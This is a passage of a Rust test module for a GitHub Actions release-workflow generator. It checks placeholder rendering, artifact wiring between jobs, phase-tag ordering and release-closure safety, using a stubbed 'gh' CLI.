                .contains("component/second/devcontainer-feature.json"),
            "the diagnostic names the configured package path: {diagnostic:?}"
        );
        assert!(
            !diagnostic
                .message
                .contains("from component/devcontainer-feature.json"),
            "the diagnostic does not invent a release-unit-root manifest: {diagnostic:?}"
        );
    }

    fn two_destination_workspace(label: &str) -> Workspace {
        let workspace = workspace_without_package(label);
        workspace
            .write(".intentional/config.yml", TWO_DESTINATION_CONFIG)
            .write("component/Dockerfile", DOCKERFILE);
        workspace
    }

    /// A Dockerfile that names the image it builds, as the recipe requires.
    const DOCKERFILE: &str =
        "FROM scratch\nLABEL org.opencontainers.image.title=\"example-image\"\n";

    /// Managed jobs of the derived publish workflow, by identifier.
    fn publish_jobs(root: &Path) -> serde_yaml::Mapping {
        let document: Value =
            serde_yaml::from_str(&workflow(root, WorkflowRole::Publish)).expect("result parses");
        document["jobs"].as_mapping().expect("jobs").clone()
    }

    fn job_needs(jobs: &serde_yaml::Mapping, id: &str) -> Vec<String> {
        jobs[&Value::String(id.to_owned())]["needs"]
            .as_sequence()
            .expect("needs")
            .iter()
            .filter_map(Value::as_str)
            .map(str::to_owned)
            .collect()
    }

    fn job_ids(jobs: &serde_yaml::Mapping, prefix: &str) -> Vec<String> {
        jobs.keys()
            .filter_map(Value::as_str)
            .filter(|id| id.starts_with(prefix))
            .map(str::to_owned)
            .collect()
    }

    /// Job and step verifying one publisher's observation after publication.
    fn publication_verification(
        jobs: &serde_yaml::Mapping,
        publisher: &str,
    ) -> (String, Vec<Value>, Value) {
        let suffix = publisher
            .rsplit_once("_publish_")
            .map(|(_, suffix)| suffix)
            .expect("publisher job identity");
        for (id, body) in jobs {
            let Some(steps) = body["steps"].as_sequence() else {
                continue;
            };
            if let Some(step) = steps.iter().find(|step| {
                step["uses"]
                    .as_str()
                    .is_some_and(|uses| uses.contains("/verify-publication@"))
                    && step["with"]["observation"]
                        .as_str()
                        .is_some_and(|path| path.ends_with(&format!("/{suffix}.yml")))
            }) {
                return (
                    id.as_str().expect("job id").to_owned(),
                    steps.clone(),
                    step.clone(),
                );
            }
        }
        panic!("{publisher} has a downstream publication verifier")
    }

    /// Every unrendered `@PLACEHOLDER@` a derived workflow still carries.
    ///
    /// A placeholder is an uppercase-and-underscore run between two `@`, which
    /// no substituted value produces: an Action pin, a token URL, and a shell
    /// variable all continue in characters this stops at.
    fn residual_placeholders(workflow: &str) -> Vec<String> {
        let bytes = workflow.as_bytes();
        let mut residual = Vec::new();
        for (start, _) in workflow.match_indices('@') {
            let mut end = start + 1;
            while end < bytes.len() && (bytes[end].is_ascii_uppercase() || bytes[end] == b'_') {
                end += 1;
            }
            if end > start + 1 && bytes.get(end) == Some(&b'@') {
                residual.push(workflow[start..=end].to_owned());
            }
        }
        residual
    }

    // Rendering substitutes derived values before namespaces, because a derived
    // value can itself name a namespace placeholder: a packager's build script
    // refers to the prefixed subject variable. Substituting in the other order
    // emits `${@ENVVAR@SUBJECT}` verbatim into a privileged job's shell, which
    // every graph, ordering, and identity assertion in this module happily
    // accepts because the document still parses and every job is still where it
    // belongs. The residue is the only observable, so the residue is what is
    // asserted -- for the whole class rather than for the one placeholder that
    // exposed it.
    #[test]
    fn leaves_no_unrendered_placeholder_in_any_derived_workflow() {
        for workspace in [
            workspace("workflow-placeholders"),
            two_destination_workspace("workflow-placeholders-oci"),
            feature_workspace("workflow-placeholders-feature"),
            // The Go workspace is the only fixture that derives the managed
            // upload job and its per-publication steps, and those steps are
            // rendered by their own builder rather than by the job renderer.
            // A placeholder left in one of them is invisible to every other
            // fixture here.
            go_workspace("workflow-placeholders-go"),
        ] {
            for role in WorkflowRole::ALL {
                converge(workspace.root(), role);
                let derived = workflow(workspace.root(), role);
                assert_eq!(
                    residual_placeholders(&derived),
                    Vec::<String>::new(),
                    "the {role} workflow renders every managed template placeholder"
                );
            }
        }
    }

    /// The other direction of the same table, which nothing covered.
    ///
    /// `leaves_no_unrendered_placeholder_in_any_derived_workflow` reads the
    /// residue a template names and a substitution misses. A substitution that
    /// names a placeholder no template carries leaves no residue at all --
    /// `replace` on an absent needle is a no-op -- so the entry is dead and
    /// every fixture above stays green. Two entries were dead when this was
    /// written, each orphaned by a template the derivation stopped rendering.
    ///
    /// The refusal is what every derivation in this module rides: a dead entry
    /// is a diagnostic from the job that carries it, so any fixture reaching
    /// that job reports it. This proves the refusal itself, on a template that
    /// names one of the two placeholders and not the other, so a rule that
    /// accepted every entry and a rule that refused every entry are both red.
    #[test]
    fn refuses_a_substitution_naming_a_placeholder_the_template_does_not_carry() {
        let namespaces = PrefixNamespaces {
            job: "intentional_".to_owned(),
            envvar: "INTENTIONAL_".to_owned(),
            environment: "intentional-release".to_owned(),
        };
        let template = "runs-on: @PRESENT@\n";
        let rendered = templates::job(
            template,
            &namespaces,
            &[("@PRESENT@", "ubuntu-latest"), ("@ABSENT@", "unread")],
        );
        let diagnostic =
            rendered.expect_err("a substitution the template does not name is refused");
        assert_eq!(diagnostic.code, "job-substitution-unnamed");
        assert!(
            diagnostic.message.contains("@ABSENT@"),
            "the diagnostic names the dead entry rather than the template: {}",
            diagnostic.message
        );

        let live = templates::job(template, &namespaces, &[("@PRESENT@", "ubuntu-latest")])
            .expect("an entry the template names renders");
        assert_eq!(
            live["runs-on"].as_str(),
            Some("ubuntu-latest"),
            "the same rule accepts the entry the template does carry"
        );

        // The upload job's repeated steps are rendered by their own entry
        // point, and a dead entry in one of those lists is exactly as silent.
        // Removing the rule from that entry point alone leaves this module's
        // job-level assertions green, so the step renderer is stated here too.
        let step = templates::step(template, &[("@ABSENT@", "unread")])
            .expect_err("a step template refuses the same entry");
        assert_eq!(step.code, "job-substitution-unnamed");
        assert!(
            templates::step(template, &[("@PRESENT@", "ubuntu-latest")])
                .is_ok_and(|rendered| rendered == "runs-on: ubuntu-latest\n"),
            "and renders the entry it does carry"
        );
    }

    /// The ordering hazard the substitution list would otherwise carry.
    ///
    /// Entries are applied in list order, so a value substituted at one
    /// position is still exposed to every entry behind it. Recipe-emitted steps
    /// sit in the middle of the publisher job's list for that reason, and the
    /// only thing that made their position safe was that no recipe happened to
    /// emit a later placeholder. This makes it a refusal instead, so the
    /// position is a free choice rather than an unasserted contract.
    ///
    /// The two values differ in exactly the property under test: one names a
    /// placeholder a later entry substitutes, the other names one an earlier
    /// entry already consumed. A rule that refused any value containing an `@`
    /// run would fail the second half.
    #[test]
    fn refuses_a_substituted_value_that_a_later_substitution_would_rewrite() {
        let namespaces = PrefixNamespaces {
            job: "intentional_".to_owned(),
            envvar: "INTENTIONAL_".to_owned(),
            environment: "intentional-release".to_owned(),
        };
        let template = "runs-on: @FIRST@@SECOND@\n";
        let diagnostic = templates::job(
            template,
            &namespaces,
            &[("@FIRST@", "names-@SECOND@"), ("@SECOND@", "-tail")],
        )
        .expect_err("a value a later entry would rewrite is refused");
        assert_eq!(diagnostic.code, "job-substitution-ordered");
        assert!(
            diagnostic.message.contains("@FIRST@") && diagnostic.message.contains("@SECOND@"),
            "the diagnostic names both ends of the collision: {}",
            diagnostic.message
        );

        let backwards = templates::job(
            template,
            &namespaces,
            &[("@FIRST@", "head"), ("@SECOND@", "-names-@FIRST@")],
        )
        .expect("a value naming an already-consumed placeholder is not a collision");
        assert_eq!(
            backwards["runs-on"].as_str(),
            Some("head-names-@FIRST@"),
            "and it survives verbatim, which is why only the forward direction is refused"
        );
    }

    /// Every artifact a managed job uploads, as artifact name to producing job.
    fn managed_uploads(root: &Path) -> BTreeMap<String, String> {
        let mut uploads = BTreeMap::new();
        for (id, steps) in managed_steps(root, WorkflowRole::Publish) {
            for step in &steps {
                if step.get("uses").and_then(Value::as_str) != Some(UPLOAD_ARTIFACT_ACTION) {
                    continue;
                }
                let name = step["with"]["name"]
                    .as_str()
                    .unwrap_or_else(|| panic!("{id} names the artifact it uploads"))
                    .to_owned();
                assert!(
                    uploads.insert(name.clone(), id.clone()).is_none(),
                    "{name} is uploaded by more than one managed job"
                );
            }
        }
        uploads
    }

    /// Every artifact selector a managed job downloads, with its consuming job.
    ///
    /// A selector is either an exact artifact name or a trailing-star prefix,
    /// which are the only two forms the download Action is given here.
    fn managed_downloads(root: &Path) -> Vec<(String, String, bool)> {
        let mut downloads = Vec::new();
        for (id, steps) in managed_steps(root, WorkflowRole::Publish) {
            for step in &steps {
                if step.get("uses").and_then(Value::as_str) != Some(DOWNLOAD_ARTIFACT_ACTION) {
                    continue;
                }
                let with = &step["with"];
                match (with["name"].as_str(), with["pattern"].as_str()) {
                    (Some(name), None) => downloads.push((id.clone(), name.to_owned(), true)),
                    (None, Some(pattern)) => {
                        let prefix = pattern.strip_suffix('*').unwrap_or_else(|| {
                            panic!("{id} downloads by a trailing-star prefix; got {pattern}")
                        });
                        downloads.push((id.clone(), prefix.to_owned(), false));
                    }
                    _ => panic!("{id} selects a download by exactly one of name or pattern"),
                }
            }
        }
        downloads
    }

    /// Artifact names one selector resolves to among what the graph produces.
    fn resolved<'a>(
        uploads: &'a BTreeMap<String, String>,
        selector: &str,
        exact: bool,
    ) -> BTreeSet<&'a str> {
        uploads
            .keys()
            .map(String::as_str)
            .filter(|name| {
                if exact {
                    *name == selector
                } else {
                    name.starts_with(selector)
                }
            })
            .collect()
    }

    /// Every managed job one job depends on, directly or through another.
    fn transitive_needs(jobs: &serde_yaml::Mapping, id: &str) -> BTreeSet<String> {
        let mut reached = BTreeSet::new();
        let mut pending = vec![id.to_owned()];
        while let Some(current) = pending.pop() {
            // The graph is rooted at tag verification, which waits for nothing.
            let needs = jobs[&Value::String(current.clone())]["needs"]
                .as_sequence()
                .map(|needs| {
                    needs
                        .iter()
                        .filter_map(Value::as_str)
                        .map(str::to_owned)
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();
            for need in needs {
                if reached.insert(need.clone()) {
                    pending.push(need);
                }
            }
        }
        reached
    }

    // Artifact names are the data path the derived graph runs on, and they agree
    // only by spelling: `download-artifact` given a pattern that matches nothing
    // does not fail, it produces an empty directory. A before-publication tag
    // then seals an empty subject set without complaint, pushes, and the run
    // dies at assembly naming a subject identity -- three jobs downstream of a
    // mistyped artifact prefix. Every other property of this graph is asserted;
    // this asserts the one the jobs actually share.
    #[test]
    fn binds_every_artifact_a_managed_job_consumes_to_the_job_that_produces_it() {
        let alternate_cargo = workspace("workflow-artifact-binding-alternate-cargo");
        alternate_cargo.write(
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"sparse+https://registry.example/index/\"\n",
        );
        alternate_cargo.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
        );
        for workspace in [
            workspace("workflow-artifact-binding"),
            npm_workspace("workflow-artifact-binding-npm"),
            two_destination_workspace("workflow-artifact-binding-oci"),
            feature_workspace("workflow-artifact-binding-feature"),
            alternate_cargo,
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let jobs = publish_jobs(workspace.root());
            let uploads = managed_uploads(workspace.root());
            let downloads = managed_downloads(workspace.root());
            assert!(
                !downloads.is_empty(),
                "the publish graph transports artifacts between managed jobs"
            );

            // No managed job consumes an artifact nothing produces, and none
            // consumes one from a job it does not wait for.
            for (consumer, selector, exact) in &downloads {
                let produced = resolved(&uploads, selector, *exact);
                assert!(
                    !produced.is_empty(),
                    "{consumer} downloads {selector}{} which no managed job uploads; produced artifacts are {:?}",
                    if *exact { "" } else { "*" },
                    uploads.keys().collect::<Vec<_>>()
                );
                let upstream = transitive_needs(&jobs, consumer);
                for name in &produced {
                    let producer = &uploads[*name];
                    assert!(
                        upstream.contains(producer),
                        "{consumer} downloads {name} from {producer} without depending on it"
                    );
                }
            }

            // Each build job publishes its subject twice: the bytes and the
            // document together for the publishers, the document alone for the
            // before-publication tag.
            let builds = job_ids(&jobs, "intentional_build_");
            let documents = builds
                .iter()
                .map(|build| {
                    let produced = uploads
                        .iter()
                        .filter(|(_, producer)| *producer == build)
                        .map(|(name, _)| name.clone())
                        .collect::<BTreeSet<_>>();
                    let slug = build
                        .strip_prefix("intentional_build_")
                        .expect("the build job carries its subject slug");
                    assert_eq!(
                        produced,
                        [
                            format!("intentional_subject-{slug}"),
                            format!("intentional_subjectdoc-{slug}"),
                        ]
                        .into_iter()
                        .collect::<BTreeSet<_>>(),
                        "{build} uploads the combined subject and the document alone"
                    );
                    format!("intentional_subjectdoc-{slug}")
                })
                .collect::<BTreeSet<_>>();

            // A publisher promotes the subject its own build job produced, by
            // exact name, and the job that verifies the publication uploads its
            // evidence fragment. A split retrieval owns verification and
            // evidence without changing which publisher promoted the bytes.
            let publishers = job_ids(&jobs, "intentional_publish_");
            let fragments = publishers
                .iter()
                .map(|publisher| {
                    let downloaded = downloads
                        .iter()
                        .filter(|(consumer, _, _)| consumer == publisher)
                        .collect::<Vec<_>>();
                    let [(_, selector, exact)] = downloaded.as_slice() else {
                        panic!("{publisher} downloads exactly its own subject: {downloaded:?}");
                    };
                    assert!(*exact, "{publisher} names the subject artifact exactly");
                    let build = job_needs(&jobs, publisher)
                        .into_iter()
                        .find(|need| need.starts_with("intentional_build_"))
                        .expect("a publisher depends on the job that built its subject");
                    let slug = build
                        .strip_prefix("intentional_build_")
                        .expect("the build job carries its subject slug");
                    assert_eq!(
                        *selector,
                        format!("intentional_subject-{slug}"),
                        "{publisher} promotes the subject {build} produced"
                    );
                    let (evidence_owner, _, _) = publication_verification(&jobs, publisher);
                    let fragment = format!(
                        "intentional_evidence-{}",
                        publisher
                            .strip_prefix("intentional_publish_")
                            .expect("the publisher carries its identity suffix")
                    );
                    assert_eq!(
                        uploads.get(&fragment).map(String::as_str),
                        Some(evidence_owner.as_str()),
                        "{evidence_owner} uploads {fragment}"
                    );
                    fragment
                })
                .collect::<BTreeSet<_>>();

            // Each phase stages exactly what it seals: the before-publication
            // tag reads the built-subject documents, the after-publication tag
            // reads the accepted publication fragments.
            let staged = |job: &str| {
                let selected = downloads
                    .iter()
                    .filter(|(consumer, _, _)| consumer == job)
                    .collect::<Vec<_>>();
                let [(_, selector, exact)] = selected.as_slice() else {
                    panic!("{job} stages one artifact selection: {selected:?}");
                };
                resolved(&uploads, selector, *exact)
                    .into_iter()
                    .map(str::to_owned)
                    .collect::<BTreeSet<_>>()
            };
            assert_eq!(
                staged("intentional_tag_before_publication"),
                documents,
                "the before-publication tag stages every built-subject document and no bytes"
            );
            let after = staged("intentional_tag_after_publication");
            assert!(
                fragments.iter().all(|fragment| after.contains(fragment)),
                "the after-publication tag stages every publication fragment: {after:?}"
            );
            assert_eq!(
                after, fragments,
                "the after-publication tag stages the publication fragments and nothing else"
            );
            let phase_documents = uploads
                .keys()
                .filter(|name| name.starts_with("intentional_phase-"))
                .cloned()
                .collect::<BTreeSet<_>>();
            assert_eq!(
                phase_documents.len(),
                job_ids(&jobs, "intentional_tag_").len(),
                "each phase tag job seals one document: {phase_documents:?}"
            );

            // Assembly reads every fragment and every sealed phase document,
            // which is what makes a phase whose evidence never arrived a
            // failure rather than a silent agreement.
            let assembled = downloads
                .iter()
                .filter(|(consumer, _, _)| consumer == "intentional_assemble_evidence")
                .flat_map(|(_, selector, exact)| resolved(&uploads, selector, *exact))
                .map(str::to_owned)
                .collect::<BTreeSet<_>>();
            assert_eq!(
                assembled,
                fragments.union(&phase_documents).cloned().collect(),
                "assembly stages every fragment and every sealed phase document"
            );
        }
    }

    // A subject is the thing a release publishes, not the act of publishing it.
    // Two destinations of one packager describe one subject, so the graph has
    // to derive one producer and two consumers of its artifact. Asserting the
    // derived graph rather than the template text is what makes this survive a
    // change in how the jobs are spelled.
    #[test]
    fn builds_one_subject_once_and_promotes_it_to_every_destination() {
        let workspace = two_destination_workspace("workflow-build-once");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let builds = job_ids(&jobs, "intentional_build_");
        assert_eq!(
            builds,
            vec!["intentional_build_component_buildx".to_owned()],
            "two destinations of one packager derive one build job: {builds:?}"
        );
        let publishers = job_ids(&jobs, "intentional_publish_");
        assert_eq!(
            publishers.len(),
            2,
            "both destinations still derive their own publisher job: {publishers:?}"
        );
        for publisher in &publishers {
            assert!(
                job_needs(&jobs, publisher).contains(&builds[0]),
                "{publisher} depends on the job that built its subject"
            );
            let downloads = jobs[&Value::String(publisher.clone())]["steps"]
                .as_sequence()
                .expect("steps")
                .iter()
                .filter_map(|step| step["with"]["name"].as_str())
                .filter(|name| name.starts_with("intentional_subject-"))
                .map(str::to_owned)
                .collect::<Vec<_>>();
            assert_eq!(
                downloads,
                vec!["intentional_subject-component_buildx".to_owned()],
                "{publisher} promotes the one built subject rather than rebuilding it"
            );
        }
    }

    // The phases exist to state what was true before and after publication, so
    // their position in the graph is the whole claim. Publication completes at
    // its verifier, which owns the accepted fragment; making the tag depend on
    // both verifier and publisher directly would add a redundant edge without
    // strengthening that boundary. Transitive reachability is therefore the
    // intended publisher ordering, while verifier membership is asserted by the
    // completion graph tests.
    #[test]
    fn orders_each_phase_tag_between_the_work_it_seals_and_the_work_it_gates() {
        let workspace = two_destination_workspace("workflow-phase-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let before = "intentional_tag_before_publication";
        let after = "intentional_tag_after_publication";
        for build in job_ids(&jobs, "intentional_build_") {
            assert!(
                job_needs(&jobs, before).contains(&build),
                "the before-publication tag seals after {build}"
            );
        }
        for publisher in job_ids(&jobs, "intentional_publish_") {
            assert!(
                job_needs(&jobs, &publisher).contains(&before.to_owned()),
                "{publisher} publishes only after the before-publication tag is sealed"
            );
            assert!(
                transitive_needs(&jobs, after).contains(&publisher),
                "the after-publication tag seals after {publisher}"
            );
        }
        let assembly = job_needs(&jobs, "intentional_assemble_evidence");
        for phase in [before, after] {
            assert!(
                assembly.contains(&phase.to_owned()),
                "assembly reads what {phase} sealed: {assembly:?}"
            );
        }
    }

    // A phase with no configured tag seals nothing, so deriving its job would
    // emit a privileged job whose command refuses the invocation.
    #[test]
    fn derives_no_tag_job_for_a_phase_the_configuration_does_not_declare() {
        let declared = workspace("workflow-one-phase");
        converge(declared.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(declared.root());
        assert!(
            jobs.contains_key(Value::String(
                "intentional_tag_after_publication".to_owned()
            )),
            "the declared phase derives its tag job"
        );

        let undeclared = workspace("workflow-no-before-phase");
        undeclared.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "      staged: { role: projection, template: '{id}/staged@{version}', require-phase: before-publication }\n",
                "",
            ),
        );
        converge(undeclared.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(undeclared.root());
        assert!(
            !jobs.contains_key(Value::String(
                "intentional_tag_before_publication".to_owned()
            )),
            "an undeclared phase derives no tag job"
        );
        assert!(
            !job_needs(&jobs, "intentional_assemble_evidence")
                .contains(&"intentional_tag_before_publication".to_owned()),
            "assembly does not wait on a job that does not exist"
        );
    }

    // Tag creation is local and pushing is repository-owned, so a phase tag
    // reaches the repository through a job that mints the installation token
    // rather than through an Intentional-owned Action.
    #[test]
    fn pushes_each_phase_tag_through_the_repository_owned_privileged_step() {
        let workspace = two_destination_workspace("workflow-phase-push");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        for phase in [
            "intentional_tag_before_publication",
            "intentional_tag_after_publication",
        ] {
            let body = &jobs[&Value::String(phase.to_owned())];
            assert_eq!(
                body["environment"].as_str(),
                Some("intentional-release"),
                "{phase} transitions authority inside the protected environment"
            );
            let steps = body["steps"].as_sequence().expect("steps");
            assert!(
                steps.iter().any(|step| step["uses"]
                    .as_str()
                    .is_some_and(|uses| uses.starts_with("actions/create-github-app-token@"))),
                "{phase} mints the installation token that is the sole push authority"
            );
            let seal = steps
                .iter()
                .position(|step| {
                    intentional_action(step).is_some_and(|(name, _)| name == "seal-phase-tags")
                })
                .unwrap_or_else(|| panic!("{phase} seals its tags through the published Action"));
            let push = steps
                .iter()
                .position(|step| {
                    step.get("run")
                        .and_then(Value::as_str)
                        .is_some_and(|body| body.contains("git push --atomic"))
                })
                .unwrap_or_else(|| panic!("{phase} pushes the tags it sealed"));
            assert!(
                seal < push,
                "{phase} seals its tags locally before any of them is pushed"
            );
        }
    }

    /// The shell of one derived managed job, in the order a runner executes it.
    fn job_script(root: &Path, role: WorkflowRole, id: &str) -> String {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"][id]["steps"]
            .as_sequence()
            .unwrap_or_else(|| panic!("the {id} job carries steps"))
            .iter()
            .filter_map(|step| step["run"].as_str())
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// The shell of the derived closure job, in the order a runner executes it.
    fn closure_script(root: &Path) -> String {
        job_script(root, WorkflowRole::Publish, "intentional_close_release")
    }

    fn offset_within(script: &str, fragment: &str) -> usize {
        script
            .find(fragment)
            .unwrap_or_else(|| panic!("`{fragment}` is part of the closure job: {script}"))
    }

    // Closure is the only point where a release becomes public, so the checks
    // that make it safe have to run while it is still reversible: a draft
    // release can be discarded, a published one cannot. Order is asserted
    // rather than presence because a rewrite that keeps every command but
    // moves one past the upload reintroduces exactly the failure the check
    // exists to prevent. Any later form of these managed jobs -- including
    // collapsing them into a composite action -- has to carry the ordering
    // forward, and this test is what refuses the alternative.
    #[test]
    fn asserts_the_release_is_a_draft_for_the_released_tag_before_uploading_assets() {
        let workspace = workspace("workflow-closure-draft-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let script = closure_script(workspace.root());

        let upload = offset_within(&script, "gh release upload");
        assert!(
            offset_within(&script, "--json isDraft") < upload,
            "the release is proven undrafted before any asset reaches it: {script}"
        );
        assert!(
            offset_within(&script, "--json tagName") < upload,
            "the release is proven to belong to the released tag before any asset \
             reaches it: {script}"
        );
    }

    // Undrafting is irreversible, so the uploaded bytes have to be proven equal
    // to the assembled bytes while the release is still private. Order is
    // asserted rather than presence because a comparison that happens after the
    // release is public can only report the corruption, not prevent it.
    #[test]
    fn compares_every_uploaded_asset_against_its_local_digest_before_undrafting() {
        let workspace = workspace("workflow-closure-digest-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let script = closure_script(workspace.root());

        let undraft = offset_within(&script, "--draft=false");
        assert!(
            offset_within(&script, "gh release download") < undraft,
            "each uploaded asset is fetched back before the release is published: {script}"
        );
        assert!(
            offset_within(&script, "sha256sum --check") < undraft,
            "each uploaded asset is compared against its local digest before the \
             release is published: {script}"
        );
    }

    const CLOSURE_TAG: &str = "sample@1.2.3";
    const CLOSURE_TAG_OBJECT: &str = "2222222222222222222222222222222222222222";
    const CLOSURE_RELEASE: &str = "1111111111111111111111111111111111111111";
    const CLOSURE_ATTACHMENTS: [(&str, &str); 3] = [
        ("sample-a.txt", "fixture a\n"),
        ("sample-b.txt", "fixture b\n"),
        ("sample-c.txt", "fixture c\n"),
    ];

    /// A `gh` stand-in that stores uploaded bytes as flat assets and serves them back.
    const GH_CLOSURE_STUB: &str = r#"#!/usr/bin/env bash
printf '%s' "$1" >> "${GH_STUB_LOG}"
for argument in "${@:2}"; do printf '\t%s' "${argument}" >> "${GH_STUB_LOG}"; done
printf '\n' >> "${GH_STUB_LOG}"
case "$1 $2" in
  "release view")
    case "$*" in
      *"--json isDraft"*) printf 'true\n' ;;
      *"--json tagName"*) printf '%s\n' "${GH_STUB_TAG}" ;;
    esac
    ;;
  "api repos/"*)
    case "$2" in
      */git/ref/tags/*) printf '%s\n' "${GH_STUB_TAG_OBJECT}" ;;
      */git/tags/*) printf '%s\n' "${GH_STUB_RELEASE}" ;;
    esac
    ;;
  "release upload")
    shift 3
    for asset in "$@"; do
      test "${asset}" = "--clobber" && continue
      if test ! -f "${asset}"; then
        printf 'upload received non-file %s\n' "${asset}" >&2
        exit 64
      fi
      cp "${asset}" "${GH_STUB_ASSETS}/$(basename "${asset}")"
    done
    ;;
  "release download")
    pattern=''
    while test "$#" -gt 0; do
      if test "$1" = "--pattern"; then pattern="$2"; break; fi
      shift
    done
    cat "${GH_STUB_ASSETS}/${pattern}"
    ;;
esac
exit 0
"#;

    /// Stage assembled evidence whose attachment vector has distinct edges and middle.
    fn closure_runner(label: &str, observed_tag_object: &str) -> StubRunner {
        let runner = StubRunner::new(label)
            .stub("gh", GH_CLOSURE_STUB)
            .setting("GITHUB_REPOSITORY", REPOSITORY_IDENTITY)
            .setting("GITHUB_SHA", CLOSURE_RELEASE)
            .setting("GH_STUB_TAG", CLOSURE_TAG)
            .setting("GH_STUB_TAG_OBJECT", observed_tag_object)
            .setting("GH_STUB_RELEASE", CLOSURE_RELEASE);
        let release = runner.temp().join("intentional_release");
        let attachments = release.join("attachments");
        let assets = runner.scaffold.root().join("closure-assets");
        std::fs::create_dir_all(&attachments).expect("the attachment fixture exists");
        std::fs::create_dir_all(&assets).expect("the flat Release asset store exists");
        let evidence = CLOSURE_ATTACHMENTS.iter().fold(
            "contribution-attachments:\n".to_owned(),
            |mut evidence, (name, _)| {
                evidence.push_str(&format!("  - namespace: sample\n    name: {name}\n"));
                evidence
            },
        );
        std::fs::write(release.join("intentional-evidence.yml"), evidence)
            .expect("the evidence fixture exists");
        for (name, contents) in CLOSURE_ATTACHMENTS {
            std::fs::write(attachments.join(name), contents)
                .expect("the contributed attachment exists");
        }
        runner.setting("GH_STUB_ASSETS", &assets.display().to_string())
    }

    /// Execute the emitted closure body with its parsed environment bindings.
    fn run_closure(root: &Path, runner: &StubRunner) -> Executed {
        let step = privileged_step(
            root,
            WorkflowRole::Publish,
            "intentional_close_release",
            "gh release upload",
        );
        let mut bindings = runner.contexts();
        bindings.insert(
            "${{ steps.intentional_token.outputs.token }}".to_owned(),
            "stub-installation-token".to_owned(),
        );
        for (name, value) in [
            ("global-tag", CLOSURE_TAG),
            ("global-tag-object", CLOSURE_TAG_OBJECT),
        ] {
            bindings.insert(
                format!("${{{{ needs.intentional_verify_tag.outputs.{name} }}}}"),
                value.to_owned(),
            );
        }
        let environment = resolved_environment(&step, &bindings, "closure");
        runner.execute(
            step["run"].as_str().expect("the closure step runs"),
            &environment,
        )
    }

    #[test]
    fn uploads_contributed_attachments_as_flat_release_assets_and_reads_them_back() {
        let workspace = workspace("workflow-closure-attachment");
        converge(workspace.root(), WorkflowRole::Publish);
        let runner = closure_runner("workflow-closure-attachment-runner", CLOSURE_TAG_OBJECT);

        let executed = run_closure(workspace.root(), &runner);
        assert!(
            executed.succeeded,
            "the assembled attachment closes successfully: {}",
            executed.diagnostics
        );
        let upload = executed
            .invocations
            .lines()
            .find(|line| line.starts_with("release\tupload"))
            .expect("the closure uploads the assembled files");
        assert!(
            upload.contains("/intentional-evidence.yml")
                && CLOSURE_ATTACHMENTS
                    .iter()
                    .all(|(name, _)| upload.contains(&format!("/attachments/{name}")))
                && !upload
                    .split('\t')
                    .any(|argument| argument.ends_with("/attachments")),
            "each inventoried attachment is a flat asset argument, never its directory: {upload}"
        );
        for name in std::iter::once("intentional-evidence.yml")
            .chain(CLOSURE_ATTACHMENTS.iter().map(|(name, _)| *name))
        {
            assert!(
                executed
                    .invocations
                    .lines()
                    .any(|line| line.starts_with("release\tdownload")
                        && line.contains(&format!("\t--pattern\t{name}"))),
                "the closure reads {name} back from the draft: {}",
                executed.invocations
            );
        }
    }

    #[test]
    fn refuses_a_retagged_object_even_when_it_targets_the_release_commit() {
        let workspace = workspace("workflow-closure-retag");
        converge(workspace.root(), WorkflowRole::Publish);
        let runner = closure_runner(
            "workflow-closure-retag-runner",
            "3333333333333333333333333333333333333333",
        );

        let executed = run_closure(workspace.root(), &runner);
        assert!(
            !executed.succeeded,
            "a replacement tag object targeting the same commit is refused"
        );
        assert!(
            executed.diagnostics.contains("not verified object")
                && !executed.invocations.contains("release\tupload"),
            "the object mismatch stops closure before upload: {:?}\n{}",
            executed.diagnostics,
            executed.invocations
        );
    }

    #[test]
    fn refuses_a_verified_tag_object_that_targets_another_commit() {
        let workspace = workspace("workflow-closure-retarget");
        converge(workspace.root(), WorkflowRole::Publish);
        let runner = closure_runner("workflow-closure-retarget-runner", CLOSURE_TAG_OBJECT)
            .setting(
                "GH_STUB_RELEASE",
                "3333333333333333333333333333333333333333",
            );

        let executed = run_closure(workspace.root(), &runner);
        assert!(
            !executed.succeeded,
            "a tag targeting another commit is refused"
        );
        assert!(
            executed.diagnostics.contains("not the released commit")
                && !executed.invocations.contains("release\tupload"),
            "the target mismatch stops closure before upload: {:?}\n{}",
            executed.diagnostics,
            executed.invocations
        );
    }

    #[test]
    fn refuses_to_close_when_contributed_attachments_cannot_be_enumerated() {
        let workspace = workspace("workflow-closure-attachment-enumeration");
        converge(workspace.root(), WorkflowRole::Publish);
        let runner = closure_runner(
            "workflow-closure-attachment-enumeration-runner",
            CLOSURE_TAG_OBJECT,
        )
        .stub(
            "find",
            "#!/usr/bin/env bash\nprintf 'fixture enumeration failure\\n' >&2\nexit 1\n",
        );

        let executed = run_closure(workspace.root(), &runner);
        assert!(!executed.succeeded, "an incomplete asset vector is refused");
        assert!(
            executed.diagnostics.contains("could not be enumerated")
                && !executed.invocations.contains("release\tupload"),
            "enumeration failure stops closure before upload: {:?}\n{}",
            executed.diagnostics,
            executed.invocations
        );
    }

    #[test]
    fn attests_every_assembled_file_before_freezing_the_release() {
        let workspace = workspace("workflow-closure-attestation");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let close = &jobs[&Value::String("intentional_close_release".to_owned())];
        assert_eq!(close["permissions"]["contents"].as_str(), Some("read"));
        assert_eq!(close["permissions"]["id-token"].as_str(), Some("write"));
        assert_eq!(close["permissions"]["attestations"].as_str(), Some("write"));

        let steps = close["steps"].as_sequence().expect("closure steps");
        let attestation = steps
            .iter()
